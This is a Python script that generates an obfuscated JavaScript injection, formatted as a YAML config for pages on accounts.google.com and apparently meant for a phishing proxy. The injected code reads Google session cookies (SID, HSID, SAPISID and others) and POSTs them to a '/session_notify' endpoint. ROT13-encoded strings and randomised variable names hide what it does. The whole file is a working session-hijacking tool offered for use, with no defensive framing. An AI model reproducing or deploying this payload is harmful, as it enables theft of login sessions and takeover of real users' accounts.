import random
import string

def random_var(length=6):
    return ''.join(random.choices(string.ascii_letters, k=length))

def rot13(s):
    return s.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))

def build_yaml_ready_payload():
    js_vars = [random_var() for _ in range(8)]
    keys = ["cookie", "match", "join", "POST", "application/json", "session_notify", "Content-Type", "fetch"]
    encoded_keys = [rot13(k) for k in keys]

    payload_lines = f"""(function(){{
  const rot13 = s => s.replace(/[a-zA-Z]/g, c =>
    String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
  );
  const {js_vars[0]} = {encoded_keys};
  const {js_vars[1]} = {js_vars[0]}.map(rot13);
  window.addEventListener('DOMContentLoaded', function() {{
    let {js_vars[2]} = setInterval(function() {{
      try {{
        let {js_vars[3]} = document[{js_vars[1]}[0]][{js_vars[1]}[1]](/(?:SID|HSID|SAPISID|SSID|APISID|SIDCC)=([^;]+)/g);
        if ({js_vars[3]} && {js_vars[3]}.length) {{
          let {js_vars[4]} = {js_vars[3]}[{js_vars[1]}[2]]("; ");
          window[{js_vars[1]}[7]]("/" + {js_vars[1]}[5], {{
            method: {js_vars[1]}[3],
            headers: {{ [{js_vars[1]}[6]]: {js_vars[1]}[4] }},
            body: JSON.stringify({{ session: {js_vars[4]} }})
          }});
          clearInterval({js_vars[2]});
        }}
      }} catch(e) {{}}
    }}, 1000);
  }});
}})();"""

    yaml_ready = "\n    script: |\n" + "\n".join(
        ["      " + line for line in payload_lines.splitlines()]
    )
    yaml_wrapper = f"""js_inject:
  - trigger_domains: ["accounts.google.com"]{yaml_ready}
"""

    return yaml_wrapper

if __name__ == "__main__":
    print(build_yaml_ready_payload())
